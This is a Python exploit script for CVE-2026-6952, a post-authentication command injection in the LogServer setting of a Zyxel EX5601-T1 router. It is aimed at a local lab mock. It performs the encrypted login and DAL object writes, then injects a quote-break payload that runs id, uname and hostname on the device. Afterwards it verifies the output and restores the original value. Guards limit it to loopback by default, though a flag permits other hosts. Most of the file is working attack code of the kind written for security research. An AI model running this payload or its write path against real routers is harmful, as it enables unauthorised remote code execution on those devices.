#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = [
#     "requests==2.32.5",
#     "cryptography==47.0.0",
# ]
# ///
"""POC-F (LAB): CVE-2026-6952 post-auth LogServer command injection on the mock.

Reconstructed live-chain lab PoC matching the original ``poc_f_cve_2026_6952_lab.py``:

1. RSA+AES login handshake (real ``presence_scanner.zyxel_client`` code path).
2. Firmware discovery + advisory compare (EX5601-T1, ``5.70(ACDZ.6)C0`` affected).
3. Syslog/LogServer DAL object discovery.
4. Baseline read of the LogServer value.
5. INJECT: shell quote-break payload ``127.0.0.1"; id > <proof>; uname -a >> <proof>;
   hostname >> <proof>; #`` written through the DAL object -> RCE via the
   vulnerable sink (``subprocess.run(shell=True)``).
6. OOB-style verification: proof file contains ``id``/``uname -a``/``hostname``.
7. RESTORE: original LogServer value; verify + evidence JSONL.

Safety: refuses to run against anything but 127.0.0.1/localhost on the lab port.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import secrets
import sys
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, urlunparse

import requests
import urllib3

REPO_ROOT = Path(__file__).resolve().parent.parent
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from presence_scanner.zyxel_client import Zyxel  # noqa: E402

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Advisory subset (Zyxel 2026-07-21, CVE-2026-6952).  Keep in sync with the
# live PoC's ADVISORY_TABLE.
# ---------------------------------------------------------------------------
ADVISORY_TABLE: dict[str, tuple[str, str]] = {
    # model: (affected <=, fixed)
    "EX5601-T1": ("5.70(ACDZ.6)C0", "5.70(ACDZ.6.1)C0"),
}

FIRMWARE_OID_CANDIDATES = [
    "DeviceInfo",
    "deviceInfo",
    "deviceinfo",
    "device_info",
]
FIRMWARE_FIELD_HINTS = ("version", "fw_ver", "firmware", "sysver")

SYSLOG_OID_CANDIDATES = [
    "syslog",
    "Syslog",
    "logserver",
    "logServer",
    "syslogSetting",
]

LOGSERVER_FIELD_HINTS = ("logserver",)

EVIDENCE_DIR = Path(__file__).resolve().parent / "evidence"


def utc_now_iso() -> str:
    return datetime.now(UTC).isoformat(timespec="seconds")


class Evidence:
    """Append-only JSONL evidence under poc/evidence/."""

    def __init__(self, name: str) -> None:
        EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
        self.path = EVIDENCE_DIR / f"{name}_{datetime.now(UTC):%Y%m%dT%H%M%S}Z.jsonl"

    def log(self, event: dict[str, Any]) -> None:
        event = {"ts": utc_now_iso(), **event}
        with self.path.open("a") as fh:
            fh.write(json.dumps(event, default=str) + "\n")
        print(f"  [evidence] {json.dumps(event, default=str)[:180]}")

    def __str__(self) -> str:
        return str(self.path)


def find_field(obj: Any, hints: tuple[str, ...]) -> list[tuple[str, Any]]:
    """Recursively find dict keys whose lowercase name contains any hint."""
    hits: list[tuple[str, Any]] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            for k, v in node.items():
                if any(h in k.lower() for h in hints):
                    hits.append((k, v))
                walk(v)
        elif isinstance(node, list):
            for item in node:
                walk(item)

    walk(obj)
    return hits


def compare_firmware(model: str, found_version: str | None) -> str:
    if model not in ADVISORY_TABLE:
        return f"model {model!r} not in the local advisory subset -- check the full Zyxel advisory manually"
    affected_max, patched = ADVISORY_TABLE[model]
    if not found_version:
        return f"firmware not found automatically; advisory says vulnerable <= {affected_max}, fixed {patched}"
    if found_version == patched or found_version > patched:
        return f"found {found_version!r} -- looks PATCHED (fixed version is {patched!r}); verify manually"
    if found_version == affected_max or found_version < patched:
        return f"found {found_version!r} -- looks VULNERABLE (advisory affected <= {affected_max!r}); verify manually"
    return f"found {found_version!r} -- inconclusive vs. advisory range [{affected_max!r}, {patched!r}]; verify manually"


def normalize_lab_url(url: str, allow_nonlocal: bool = False) -> str:
    """Return the base URL the lab PoC may talk to.

    Default: only 127.0.0.1/localhost/::1.  With allow_nonlocal=True the
    caller is explicitly opting into hitting the mock on a real interface
    (e.g. a container IP) -- the mock is still the only thing speaking this
    lab protocol, so this NEVER broadens scope onto live routers.
    """
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if host not in ("127.0.0.1", "localhost", "::1"):
        if not allow_nonlocal:
            raise SystemExit(
                f"REFUSING to run against {url!r}: the LAB PoC only targets 127.0.0.1."
                " Use poc_f_logserver_rce.py for live targets, or pass --allow-nonlocal"
                " ONLY when the target is your own lab mock on a container/VM interface."
            )
        print(f"[!] --allow-nonlocal: targeting {url!r} -- confirm this is YOUR lab mock, not a live router")
    if host in ("127.0.0.1", "localhost", "::1"):
        # Loopback: the lab mock always listens on plain HTTP :8812.
        scheme = "http"
        port = parsed.port or 8812
    else:
        # Nonlocal (tunnel/container): preserve the caller's scheme so an
        # https://*.trycloudflare.com target keeps TLS and defaults to :443.
        scheme = (parsed.scheme or "https").lower()
        if scheme not in ("http", "https"):
            scheme = "https"
        port = parsed.port or (443 if scheme == "https" else 80)
    netloc = f"{host}:{port}"
    return urlunparse((scheme, netloc, parsed.path or "", "", "", ""))


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="POC-F LAB: CVE-2026-6952 LogServer command injection (mock)")
    p.add_argument("--target", "--url", dest="url", default="http://127.0.0.1:8812",
                   help="mock base URL (default http://127.0.0.1:8812)")
    p.add_argument("--user", default=None, help="mock login user (default: $LAB_USER env or 'admin')")
    p.add_argument("--pass", dest="password", default=None,
                   help="mock login password (default: $LAB_PASS env or 'LabPass#2026'; "
                        "NEVER the real .envrc ZYXEL_PASS)")
    p.add_argument("--model", default="EX5601-T1", help="device model for the advisory table")
    p.add_argument("--proof-dir", default="/tmp/zyxel6952_lab", help="dir where the payload writes its proof file")
    p.add_argument("--yes", action="store_true", help="execute the injection (default: dry-run)")
    p.add_argument("--allow-nonlocal", action="store_true",
                   help="permit non-loopback target (lab mock on a container/VM interface ONLY)")
    return p.parse_args()


def dal_get(zyxel: Zyxel, oid: str) -> tuple[bool, Any]:
    try:
        data = zyxel._get_json(f"/cgi-bin/DAL?oid={oid}&DalGetOneObject=y")  # noqa: SLF001
        return True, data
    except Exception as exc:
        return False, f"{exc.__class__.__name__}: {exc}"


def dal_set(zyxel: Zyxel, oid: str, object_body: dict) -> tuple[bool, Any]:
    """One-object DAL write through the AES envelope (same as live PoC)."""
    path = f"{zyxel.base_url}/cgi-bin/DAL?oid={oid}"
    object_json = json.dumps({"Object": [object_body]})
    body = json.dumps({
        "content": zyxel._aes_encrypt(object_json),  # noqa: SLF001
        "iv": zyxel._iv_b64,  # noqa: SLF001
    })
    try:
        resp = zyxel.session.post(
            path, data=body,
            headers={"Content-Type": "application/json", "CSRFToken": zyxel.sessionkey or ""},
            timeout=30,
        )
        raw = resp.json()
        if isinstance(raw, dict) and "content" in raw and "iv" in raw:
            return True, json.loads(zyxel._aes_decrypt(raw["content"], raw["iv"]))  # noqa: SLF001
        return resp.status_code < 400, {"status": resp.status_code, "body": raw}
    except Exception as exc:
        return False, f"{exc.__class__.__name__}: {exc}"


def main() -> None:
    args = parse_args()
    base_url = normalize_lab_url(args.url, allow_nonlocal=args.allow_nonlocal)
    evidence = Evidence("pocF_cve_2026_6952_lab")
    print(f"POC-F LAB target: {base_url} (mock; model: {args.model})")
    print("Reference: CVE-2026-6952 (Zyxel advisory 2026-07-21, post-auth LogServer command injection)")

    # ------------------------------------------------------------ login
    # Credential resolution (priority): --user/--pass flags  >  $LAB_USER /
    # $LAB_PASS environment (the mock reads the same two variables, so lab env
    # and PoC always stay in sync)  >  demo defaults admin/LabPass#2026.
    # ZYXEL_USER/ZYXEL_PASS from .envrc are deliberately NEVER read here:
    # this script only ever talks to the lab mock, and sending the real router
    # password to it would leak it (and the mock would reject it anyway).
    if args.user is not None or args.password is not None:
        cred_note = "from --user/--pass flags"
        login_user = args.user or os.environ.get("LAB_USER") or "admin"
        login_pass = args.password or os.environ.get("LAB_PASS") or "LabPass#2026"
    elif os.environ.get("LAB_USER") is not None or os.environ.get("LAB_PASS") is not None:
        cred_note = "from $LAB_USER/$LAB_PASS env"
        login_user = os.environ.get("LAB_USER", "admin")
        login_pass = os.environ.get("LAB_PASS", "LabPass#2026")
    else:
        cred_note = "demo defaults (admin/LabPass#2026)"
        login_user, login_pass = "admin", "LabPass#2026"
    print(f"login credentials: {cred_note}")

    zyxel = Zyxel(base_url=base_url)
    try:
        zyxel.login(login_user, login_pass)
    except Exception as exc:
        evidence.log({"event": "login", "ok": False, "error": f"{exc.__class__.__name__}: {exc}"})
        raise SystemExit(f"login failed: {exc}")
    evidence.log({"event": "login", "ok": True, "user": login_user,
                  "sessionkey_present": bool(zyxel.sessionkey)})
    print(f"login OK (session key: {zyxel.sessionkey[:8]}...)")

    # ---------------------------------------------------- firmware discovery
    print("\n=== Firmware discovery ===")
    found_version: str | None = None
    for oid in FIRMWARE_OID_CANDIDATES:
        ok, data = dal_get(zyxel, oid)
        print(f"  oid={oid:<14} {'OK' if ok else 'no'}  {str(data)[:140]}")
        evidence.log({"event": "discover_firmware_oid", "oid": oid, "ok": ok, "raw": str(data)[:500]})
        if ok:
            for key, val in find_field(data, FIRMWARE_FIELD_HINTS):
                print(f"    field hit: {key} = {val!r}")
                if found_version is None and isinstance(val, str) and "(" in val:
                    found_version = val
    verdict = compare_firmware(args.model, found_version)
    print(f"Verdict: {verdict}")
    evidence.log({"event": "firmware_verdict", "model": args.model,
                  "found_version": found_version, "verdict": verdict})

    # ---------------------------------------------------- syslog discovery
    print("\n=== Syslog / LogServer discovery ===")
    candidates: list[tuple[str, str, Any]] = []
    for oid in SYSLOG_OID_CANDIDATES:
        ok, data = dal_get(zyxel, oid)
        print(f"  oid={oid:<14} {'OK' if ok else 'no'}  {str(data)[:140]}")
        evidence.log({"event": "discover_syslog_oid", "oid": oid, "ok": ok, "raw": str(data)[:500]})
        if ok:
            hits = find_field(data, LOGSERVER_FIELD_HINTS)
            for key, val in hits:
                print(f"    *** LogServer-like field found: oid={oid} field={key} value={val!r} ***")
                evidence.log({"event": "logserver_field_found", "oid": oid, "field": key, "value": str(val)})
                candidates.append((oid, key, val))
    # Prefer the exact LogServer string field (NOT LogServerPort) - first OID wins.
    exact = [(oid, k, v) for (oid, k, v) in candidates if k.lower() == "logserver"]
    chosen = exact[0] if exact else (candidates[0] if candidates else None)
    if chosen is None:
        raise SystemExit("no LogServer field found; nothing to inject")
    logserver_oid, logserver_field, logserver_value = chosen

    # ------------------------------------------------------------- baseline
    print(f"\nBaseline LogServer: {logserver_field}={logserver_value!r} (oid={logserver_oid})")
    evidence.log({"event": "baseline", "oid": logserver_oid, "field": logserver_field,
                  "value": str(logserver_value)})

    # --------------------------------------------------------------- inject
    token = secrets.token_hex(4)
    proof_path = str(Path(args.proof_dir) / f"proof_{token}.txt")
    injected = f'127.0.0.1"; id > {proof_path}; uname -a >> {proof_path}; hostname >> {proof_path}; #'
    plan = (f"write oid={logserver_oid} field={logserver_field} = <quote-break payload> "
            f"(token={token}, proof={proof_path}), then restore original value")
    print(f"\nInject plan: {plan}")
    if not args.yes:
        print("DRY-RUN (--yes not given); aborting before write.")
        evidence.log({"event": "dry_run", "oid": logserver_oid, "token": token})
        return

    print(f"\nPayload: {injected}")
    current_obj = None
    ok, current = dal_get(zyxel, logserver_oid)
    if not ok:
        raise SystemExit(f"could not read current object at oid={logserver_oid}: {current}")
    current_obj = current["Object"][0] if isinstance(current, dict) else current

    # Top-level merge like the live PoC: nested objects may need a smarter merge.
    mutated = dict(current_obj) if isinstance(current_obj, dict) else current_obj
    if isinstance(mutated, dict):
        inner = mutated.get(logserver_oid) or mutated.get("syslog")
        if isinstance(inner, dict):
            inner[logserver_field] = injected
        elif logserver_field in mutated:
            mutated[logserver_field] = injected
        else:
            raise SystemExit(f"field {logserver_field!r} not at top level or under oid key; adjust merge")
    else:
        raise SystemExit("mock returned a non-dict object; aborting")

    write_ok, write_resp = dal_set(zyxel, logserver_oid, mutated)
    print(f"write result: {'OK' if write_ok else 'FAILED'}  {str(write_resp)[:300]}")
    evidence.log({"event": "inject_write", "oid": logserver_oid, "token": token, "proof": proof_path,
                  "ok": write_ok, "payload": injected, "response": str(write_resp)[:500]})
    if not write_ok:
        raise SystemExit("injection write failed; aborting before restore")

    # ---------------------------------------------- verify (OOB-style proof)
    print("\n=== Verification ===")
    time.sleep(0.5)  # give the sandboxed sink a beat (same-host mock)
    proof_content = ""
    try:
        r = requests.get(f"{base_url}/lab/proof", timeout=5)
        files = r.json().get("proof_files", [])
        for pf in files:
            if pf["path"] == f"proof_{token}.txt":
                proof_content = pf["content"]
        print(f"proof files on mock: {[pf['path'] for pf in files]}")
    except Exception as exc:
        print(f"  (lab/proof fetch failed: {exc.__class__.__name__})")
        # same-host fallback: the payload wrote directly into the host fs
        local = Path(proof_path)
        if local.exists():
            proof_content = local.read_text(errors="replace")
            print(f"  (read proof from host fs: {local})")

    print(f"\nproof file content ({len(proof_content)} bytes):\n{proof_content}")
    evidence.log({"event": "verify_proof", "token": token, "proof": proof_path,
                  "content": proof_content[:2000]})

    lines = [l for l in proof_content.splitlines() if l.strip()]
    has_id = any("uid=" in l for l in lines)
    has_uname = any(l.startswith(("Linux", "Darwin", "FreeBSD", "OpenBSD")) for l in lines)
    # hostname line: a single non-empty word (e.g. "e2b.local")
    has_hostname = any(len(l.split()) == 1 and "." in l or (len(l.split()) == 1 and l.islower()) for l in lines)

    if has_id and has_uname and has_hostname:
        print("\n*** RCE CONFIRMED: id + uname -a + hostname captured from the sink ***")
        evidence.log({"event": "rce_confirmed", "token": token, "check": "id+uname+hostname"})
    elif has_id and has_uname:
        print("\n*** RCE CONFIRMED: id + uname -a captured from the sink (hostname line missing) ***")
        evidence.log({"event": "rce_confirmed", "token": token, "check": "id+uname"})
    else:
        print("\nWARNING: proof file missing or incomplete -- injection did NOT produce RCE")
        evidence.log({"event": "rce_missing", "token": token, "check": "id+uname+hostname",
                      "has_id": has_id, "has_uname": has_uname, "has_hostname": has_hostname})

    # --------------------------------------------------------------- restore
    print("\n=== Restore ===")
    if isinstance(mutated, dict):
        inner = mutated.get(logserver_oid) or mutated.get("syslog")
        if isinstance(inner, dict):
            inner[logserver_field] = logserver_value
        else:
            mutated[logserver_field] = logserver_value
    restore_ok, restore_resp = dal_set(zyxel, logserver_oid, mutated)
    print(f"restore result: {'OK' if restore_ok else 'FAILED'}  {str(restore_resp)[:300]}")
    evidence.log({"event": "inject_restore", "oid": logserver_oid,
                  "ok": restore_ok, "response": str(restore_resp)[:500]})

    try:
        st = requests.get(f"{base_url}/lab/state", timeout=5).json()
        print(f"mock state after restore: LogServer={st.get('logserver')!r} port={st.get('logserver_port')}")
        evidence.log({"event": "post_restore_state", "state": st})
    except Exception as exc:
        print(f"  (state fetch failed: {exc.__class__.__name__})")

    # clean the proof file on the host if it exists (lab hygiene)
    local_proof = Path(proof_path)
    if local_proof.exists():
        local_proof.unlink()
        print(f"cleaned host proof file {local_proof}")

    print(f"\nevidence file: {evidence}")


if __name__ == "__main__":
    main()